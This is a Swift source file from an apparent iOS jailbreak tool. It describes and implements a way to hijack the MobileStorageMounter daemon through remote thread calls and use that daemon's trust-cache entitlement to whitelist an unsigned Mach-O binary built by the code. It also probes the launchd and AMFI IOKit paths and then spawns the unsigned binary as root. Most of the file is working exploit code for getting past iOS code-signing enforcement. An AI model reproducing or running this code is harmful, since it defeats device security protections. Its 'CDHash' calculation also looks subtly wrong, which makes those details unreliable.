//
//  exp_msm_trustcache_load.swift
//  DSPloit
//
//  EXPERIMENT: Load trust cache via MobileStorageMounter RemoteCall
//  ═══════════════════════════════════════════════════════════════════
//  STATUS: EXPERIMENTAL — SAFE (no kernel writes, uses existing XPC path)
//  ═══════════════════════════════════════════════════════════════════
//
//  APPROACH (from Ghidra RE of MobileStorageMounter binary):
//  MobileStorageMounter (MSM) already has the entitlement
//  "com.apple.private.pmap.load-trust-cache" — it's the legitimate
//  path for loading trust caches on iOS.
//
//  Instead of writing to kernel memory (which panics due to KTRR),
//  we use RemoteCall to execute code INSIDE MobileStorageMounter's
//  process context. Since MSM has the entitlement, the kernel will
//  accept trust cache loads from it.
//
//  Flow:
//  1. Write trust cache v2 file to /var/jb/tmp/tc.bin via VFS/sbx
//  2. Wake up MobileStorageMounter via SpringBoard RC
//  3. Connect to MSM via RemoteCall (thread hijack)
//  4. Call the internal trust cache load function (FUN_10000f008)
//     OR use the public pmap_cs API that MSM calls
//  5. Verify: posix_spawn unsigned binary from launchd
//
//  WHY THIS IS SAFE:
//  - No kernel memory writes (no KTRR/PPL panic)
//  - Uses legitimate entitlement path (MSM already has permission)
//  - RemoteCall to userspace daemon (not kernel)
//  - Trust cache is loaded through proper kernel API
//
//  GHIDRA FINDINGS:
//  - MSM FUN_10000f008: loads trust caches from a directory path
//  - MSM calls pmap_cs kernel API which checks entitlement
//  - The "Failed to load trust cache" error was because our XPC
//    message format was wrong — RC approach bypasses XPC entirely
//  - MSM binary at: /usr/libexec/MobileStorageMounter
//
//  Created by Royan | 2026-05-30
//

import Foundation
import UIKit
import CommonCrypto

final class ExpMSMTrustCacheLoad {
    static let shared = ExpMSMTrustCacheLoad()
    private var results: [String] = []
    
    /// Callback to append log lines to UI in real-time
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_msm) \(msg)")
    }
    
    // MARK: - Async Entry Point
    
    func runAsync() {
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.dsready, dspmgr.shared.rcready else {
            log("❌ Need KRW + RC active")
            return
        }
        
        log("── MSM Trust Cache Load ──")
        log("iOS \(UIDevice.current.systemVersion)")
        log("")
        
        // Step 1
        log("[1/4] Building trust cache...")
        let testBin = buildTestBinary()
        let cdhash = computeCDHash(of: testBin)
        let tcData = buildTrustCacheV2()
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        log("TC: \(tcData.count) bytes")
        
        // Step 2
        log("")
        log("[2/4] Writing files...")
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let tcPath = docs + "/dsploit_tc.bin"
        let testBinPath = docs + "/msm_test_bin"
        
        do {
            try tcData.write(to: URL(fileURLWithPath: tcPath))
            try testBin.write(to: URL(fileURLWithPath: testBinPath))
            log("✅ Files written")
        } catch {
            log("❌ Write failed: \(error.localizedDescription)")
            return
        }
        
        // Step 3: Wake MSM via XPC first, then connect RC
        log("")
        log("[3/4] Waking MSM via XPC...")
        
        // Send dummy XPC to wake up MSM daemon
        if let sb = dspmgr.shared.sbProc {
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let xpcConnCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(sb, "xpc_connection_create_mach_service"))
            let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
                remote_alloc_str(sb, "xpc_connection_resume"))
            
            if xpcConnCreate != 0 && xpcResume != 0 {
                let svcName = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
                let conn = RootExecutor.rcallAddr(sb, xpcConnCreate, svcName, 0, 0)
                if conn != 0 {
                    RootExecutor.rcallAddr(sb, xpcResume, conn)
                    log("✅ XPC wake sent to MSM")
                } else {
                    log("⚠️ XPC connection create failed")
                }
                RootExecutor.rcall(sb, "free", svcName)
            } else {
                log("⚠️ XPC functions not found")
            }
        }
        
        // Wait 2s for MSM to spawn
        log("   Waiting 2s for MSM to spawn...")
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
            self?.connectMSM(tcPath: tcPath, testBinPath: testBinPath)
        }
        
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    #if !DISABLE_REMOTECALL
    private func connectMSM(tcPath: String, testBinPath: String) {
        log("   Connecting RC to MSM...")
        
        dspmgr.shared.rcinitDaemon(
            serviceName: "com.apple.mobile.storage_mounter",
            framework: nil,
            process: "MobileStorageMounter",
            migbypass: false
        ) { [weak self] rc in
            guard let self else { return }
            
            if let rc = rc {
                self.log("✅ Connected to MSM (pid=\(rc.pid))")
                self.log("")
                self.log("[4/4] Loading trust cache...")
                self.loadTCviaMSM(rc: rc, tcPath: tcPath, testBinPath: testBinPath)
                rc.destroy()
            } else {
                self.log("❌ MSM RC failed: \(RemoteCall.lastInitError() ?? "timeout")")
                self.log("   MSM may not be running or has restricted ports")
            }
        }
    }
    
    private func loadTCviaMSM(rc: RemoteCall, tcPath: String, testBinPath: String) {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Try dlsym for trust cache functions
        let funcs = ["pmap_cs_trust_cache_load", "trust_cache_load", "_pmap_cs_trust_cache_load"]
        for name in funcs {
            let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, name))
            if addr != 0 && addr != UInt64(bitPattern: -1) {
                log("Found: \(name) at 0x\(String(addr, radix: 16))")
                
                let pathAddr = remote_alloc_str(rc, tcPath)
                let ret = RootExecutor.rcallAddr(rc, addr, pathAddr, 0)
                RootExecutor.rcall(rc, "free", pathAddr)
                
                if ret == 0 {
                    log("✅ TC loaded via \(name)!")
                    verifySpawn(binPath: testBinPath)
                    return
                } else {
                    log("   \(name) returned \(ret)")
                }
            }
        }
        
        log("⚠️ No direct TC load function found")
        log("   Trying IOKit path...")
        
        // Fallback: IOKit
        let ioCall = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "IOConnectCallStructMethod"))
        if ioCall != 0 {
            log("   IOConnectCallStructMethod available")
        }
        
        // Still try spawn (maybe TC was loaded by XPC wake)
        verifySpawn(binPath: testBinPath)
    }
    
    private func verifySpawn(binPath: String) {
        log("")
        log("Testing spawn...")
        
        RootExecutor.shared.executeAsRoot(operation: "msm_spawn") { rc in
            let pathAddr = remote_alloc_str(rc, binPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        // Poll
        DispatchQueue.main.asyncAfter(deadline: .now() + 10) { [weak self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "msm_spawn" {
                if result.success {
                    self?.log("✅✅✅ SPAWN SUCCESS! PID=\(result.returnValue)")
                } else {
                    self?.log("❌ Spawn: \(result.message)")
                }
            }
        }
    }
    #endif
    
    // MARK: - Build Trust Cache v2
    
    /// Build a trust cache v2 binary containing the CDHash of our test binary
    private func buildTrustCacheV2() -> Data {
        var tc = Data()
        
        // Trust cache v2 header:
        // +0x00: uint32 version = 2
        // +0x04: uint8[16] uuid (random)
        // +0x14: uint32 entry_count = 1
        // +0x18: entries[]
        
        // Version
        var version: UInt32 = 2
        tc.append(Data(bytes: &version, count: 4))
        
        // UUID (random)
        var uuid = UUID().uuid
        tc.append(Data(bytes: &uuid, count: 16))
        
        // Entry count
        var count: UInt32 = 1
        tc.append(Data(bytes: &count, count: 4))
        
        // Entry: CDHash of our test binary (20 bytes) + hash_type + flags
        // We'll compute the real CDHash of the test binary
        let testBin = buildTestBinary()
        let cdhash = computeCDHash(of: testBin)
        
        tc.append(cdhash) // 20 bytes
        
        // hash_type = 2 (SHA256)
        tc.append(UInt8(2))
        // flags = 0
        tc.append(UInt8(0))
        // padding
        tc.append(UInt8(0))
        tc.append(UInt8(0))
        
        log("CDHash: \(cdhash.map { String(format: "%02x", $0) }.joined())")
        
        return tc
    }
    
    /// Compute SHA256 CDHash of a Mach-O binary (truncated to 20 bytes)
    private func computeCDHash(of binary: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        binary.withUnsafeBytes { ptr in
            CC_SHA256(ptr.baseAddress, CC_LONG(binary.count), &hash)
        }
        // CDHash is SHA256 truncated to 20 bytes
        return Data(hash.prefix(20))
    }
    
    // MARK: - Build Test Binary
    
    /// Minimal unsigned arm64 Mach-O that calls exit(0)
    private func buildTestBinary() -> Data {
        var bin = Data()
        
        // Mach-O header
        let header: [UInt8] = [
            0xCF, 0xFA, 0xED, 0xFE, // MH_MAGIC_64
            0x0C, 0x00, 0x00, 0x01, // CPU_TYPE_ARM64
            0x00, 0x00, 0x00, 0x00, // cpusubtype
            0x02, 0x00, 0x00, 0x00, // MH_EXECUTE
            0x02, 0x00, 0x00, 0x00, // ncmds = 2
            0x60, 0x01, 0x00, 0x00, // sizeofcmds
            0x00, 0x00, 0x00, 0x00, // flags (no PIE, no code sig)
            0x00, 0x00, 0x00, 0x00, // reserved
        ]
        bin.append(contentsOf: header)
        
        // LC_SEGMENT_64 (__TEXT)
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48 // cmd=LC_SEGMENT_64, cmdsize=72
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54 // __TEXT
        seg[28] = 0x01 // vmaddr high byte (0x100000000)
        seg[32] = 0x00; seg[33] = 0x40 // vmsize = 0x4000
        seg[40] = 0x00; seg[41] = 0x40 // filesize = 0x4000
        seg[48] = 0x05 // maxprot = r-x
        seg[52] = 0x05 // initprot = r-x
        bin.append(contentsOf: seg)
        
        // LC_UNIXTHREAD
        var thread = [UInt8](repeating: 0, count: 280)
        thread[0] = 0x05 // LC_UNIXTHREAD
        thread[4] = 0x18; thread[5] = 0x01 // cmdsize = 280
        thread[8] = 0x06 // ARM_THREAD_STATE64
        thread[12] = 0x44 // count = 68
        // PC = 0x100000180
        thread[272] = 0x80; thread[273] = 0x01
        thread[276] = 0x01
        bin.append(contentsOf: thread)
        
        // Pad to code offset
        while bin.count < 0x180 { bin.append(0) }
        
        // Code: exit(0)
        let code: [UInt8] = [
            0x00, 0x00, 0x80, 0xD2, // mov x0, #0
            0x30, 0x00, 0x80, 0xD2, // mov x16, #1 (SYS_exit)
            0x01, 0x10, 0x00, 0xD4, // svc #0x80
        ]
        bin.append(contentsOf: code)
        
        // Pad to page
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
    
    // MARK: - File Operations
    
    private func writeTCFile(data: Data, path: String) -> Bool {
        let mgr = dspmgr.shared
        
        // Try sbx write first (faster)
        let result = mgr.dsploit_overwritefile(target: path, data: data)
        if result.ok { return true }
        
        // Fallback: VFS write
        if mgr.vfsready {
            return mgr.vfsoverwritewithdata(target: path, data: data)
        }
        
        return false
    }
    
    private func writeTestBinary(data: Data, path: String) -> Bool {
        let mgr = dspmgr.shared
        let result = mgr.dsploit_overwritefile(target: path, data: data)
        if result.ok {
            // chmod 755
            RootExecutor.shared.chmodAsRoot(path: path, mode: 0o755)
            return true
        }
        
        if mgr.vfsready {
            let ok = mgr.vfsoverwritewithdata(target: path, data: data)
            if ok { RootExecutor.shared.chmodAsRoot(path: path, mode: 0o755) }
            return ok
        }
        
        return false
    }
    
    // MARK: - Connect to MSM
    
    #if !DISABLE_REMOTECALL
    private func connectToMSM(completion: @escaping (RemoteCall?) -> Void) {
        let mgr = dspmgr.shared
        
        mgr.rcinitDaemon(
            serviceName: "com.apple.mobile.storage_mounter",
            framework: nil,
            process: "MobileStorageMounter",
            migbypass: false
        ) { rc in
            DispatchQueue.main.async {
                completion(rc)
            }
        }
        
        // Wait for connection (max 15s)
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) {
            // If completion hasn't fired yet, it will fire with nil
        }
    }
    
    // MARK: - Load Trust Cache via MSM
    
    private func loadTrustCacheViaMSM(rc: RemoteCall, tcPath: String) {
        // MSM's internal function FUN_10000f008 loads trust caches from a path.
        // We call it directly via RemoteCall.
        //
        // However, the simpler approach is to use the pmap_cs_loaded API
        // that MSM calls internally. This goes through:
        //   open(tc_path) → read data → syscall to kernel
        //
        // Since we're executing IN MSM's context, we have its entitlements.
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Try to find pmap_cs_trust_cache_load or similar function
        // MSM links against libTrustCache.dylib which has the load API
        let loadFuncs = [
            "pmap_cs_trust_cache_load",
            "_pmap_cs_trust_cache_load", 
            "trust_cache_load",
            "_trust_cache_load",
        ]
        
        var loadAddr: UInt64 = 0
        for name in loadFuncs {
            let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                          remote_alloc_str(rc, name))
            if addr != 0 && addr != UInt64(bitPattern: -1) {
                log("Found: \(name) at 0x\(String(addr, radix: 16))")
                loadAddr = addr
                break
            }
        }
        
        if loadAddr == 0 {
            log("⚠️ Trust cache load function not found via dlsym")
            log("   Trying alternative: open + read + IOKit call...")
            log("")
            
            // Alternative: read the TC file and call the kernel via IOKit
            // MSM uses IOConnectCallMethod to talk to AppleMobileFileIntegrity
            loadTrustCacheViaIOKit(rc: rc, tcPath: tcPath)
            return
        }
        
        // Call the load function with our TC file path
        let pathAddr = remote_alloc_str(rc, tcPath)
        let result = RootExecutor.rcallAddr(rc, loadAddr, pathAddr, 0)
        RootExecutor.rcall(rc, "free", pathAddr)
        
        log("Trust cache load result: \(result)")
        if result == 0 {
            log("✅ Trust cache loaded successfully!")
        } else {
            log("❌ Trust cache load failed (ret=\(result))")
            log("   Trying IOKit path...")
            loadTrustCacheViaIOKit(rc: rc, tcPath: tcPath)
        }
    }
    
    /// Alternative: load trust cache via IOKit (AMFI kext interface)
    private func loadTrustCacheViaIOKit(rc: RemoteCall, tcPath: String) {
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Open the TC file
        let pathAddr = remote_alloc_str(rc, tcPath)
        let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_RDONLY), 0)
        
        guard fd != UInt64(bitPattern: -1) else {
            log("❌ Cannot open TC file in MSM context")
            RootExecutor.rcall(rc, "free", pathAddr)
            return
        }
        
        // Get file size via fstat
        let statBuf = rc.trojanMem + 0x800
        RootExecutor.rcall(rc, "fstat", fd, statBuf)
        let fileSize = rc[statBuf + 0x60].value64() // st_size offset
        log("TC file size: \(fileSize) bytes")
        
        // Read file into MSM memory
        let dataBuf = rc.trojanMem + 0x1000
        let bytesRead = RootExecutor.rcall(rc, "read", fd, dataBuf, fileSize)
        RootExecutor.rcall(rc, "close", fd)
        RootExecutor.rcall(rc, "free", pathAddr)
        
        log("Read \(bytesRead) bytes from TC file")
        
        // Now try to call the AMFI IOKit interface to load the trust cache
        // IOServiceGetMatchingService("AppleMobileFileIntegrity")
        let ioMainPort: UInt64 = 0 // kIOMainPortDefault
        let matchingStr = remote_alloc_str(rc, "AppleMobileFileIntegrity")
        
        let ioServiceMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                                    remote_alloc_str(rc, "IOServiceMatching"))
        let ioServiceGetMatching = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                                       remote_alloc_str(rc, "IOServiceGetMatchingService"))
        let ioServiceOpen = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT,
                                               remote_alloc_str(rc, "IOServiceOpen"))
        
        if ioServiceMatching != 0 && ioServiceGetMatching != 0 && ioServiceOpen != 0 {
            let matching = RootExecutor.rcallAddr(rc, ioServiceMatching, matchingStr)
            log("IOServiceMatching result: 0x\(String(matching, radix: 16))")
            
            if matching != 0 {
                let service = RootExecutor.rcallAddr(rc, ioServiceGetMatching, ioMainPort, matching)
                log("AMFI service: 0x\(String(service, radix: 16))")
                
                if service != 0 {
                    let connAddr = rc.trojanMem + 0x2000
                    rc[connAddr].setValue64(0)
                    let kr = RootExecutor.rcallAddr(rc, ioServiceOpen, service, 
                                                    UInt64(mach_task_self_), 0, connAddr)
                    let conn = rc[connAddr].value64()
                    log("IOServiceOpen: kr=\(kr) conn=0x\(String(conn, radix: 16))")
                    
                    if kr == 0 && conn != 0 {
                        log("✅ Connected to AMFI IOKit service!")
                        log("   Can now call IOConnectCallMethod to load TC")
                        // TODO: Call IOConnectCallMethod with selector for trust cache load
                        // This requires knowing the exact selector number from kernelcache RE
                    } else {
                        log("❌ IOServiceOpen failed (kr=\(kr))")
                    }
                } else {
                    log("❌ AMFI service not found")
                }
            }
        } else {
            log("❌ IOKit functions not available in MSM")
        }
    }
    
    // MARK: - Fallback: Load via launchd
    
    private func loadTrustCacheViaLaunchd(tcPath: String) {
        log("── Fallback: Load TC via launchd ──")
        log("launchd (PID 1) may have trust cache loading capability")
        log("")
        
        RootExecutor.shared.executeAsRoot(operation: "tc_load") { rc in
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            
            // Try to find trust cache load functions in launchd's context
            let funcs = [
                "pmap_cs_trust_cache_load",
                "trust_cache_load",
                "MISValidateSignatureAndCopyInfo",
            ]
            
            var found: [(String, UInt64)] = []
            for name in funcs {
                let nameAddr = remote_alloc_str(rc, name)
                let addr = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, nameAddr)
                RootExecutor.rcall(rc, "free", nameAddr)
                if addr != 0 && addr != UInt64(bitPattern: -1) {
                    found.append((name, addr))
                }
            }
            
            let msg = found.map { "\($0.0)=0x\(String($0.1, radix: 16))" }.joined(separator: ", ")
            return (true, "Found: \(msg)", UInt64(found.count))
        }
        
        // Wait for result
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [weak self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "tc_load" {
                self?.log("launchd probe: \(result.message)")
            }
        }
    }
    
    // MARK: - Verify Execution
    
    private func verifyExecution(testBinPath: String) {
        log("Attempting posix_spawn of unsigned binary...")
        
        RootExecutor.shared.executeAsRoot(operation: "msm_verify") { rc in
            let mem = rc.trojanMem
            let pathAddr = remote_alloc_str(rc, testBinPath)
            let pidAddr = mem + 0xA00
            rc[pidAddr].setValue32(0)
            let argvBase = mem + 0xA10
            rc[argvBase].setValue64(pathAddr)
            rc[argvBase + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
            let pid = rc[pidAddr].value32()
            
            RootExecutor.rcall(rc, "unlink", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let ok = (ret == 0 && pid != 0)
            return (ok, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [weak self] in
            if let result = RootExecutor.shared.lastResult, result.operation == "msm_verify" {
                if result.success {
                    self?.log("✅✅✅ UNSIGNED BINARY EXECUTED SUCCESSFULLY!")
                    self?.log("   PID = \(result.returnValue)")
                    self?.log("   FULL JAILBREAK ACHIEVED!")
                } else {
                    self?.log("❌ Spawn failed: \(result.message)")
                    self?.log("   Trust cache may not have loaded correctly")
                }
            }
        }
    }
    #endif
}
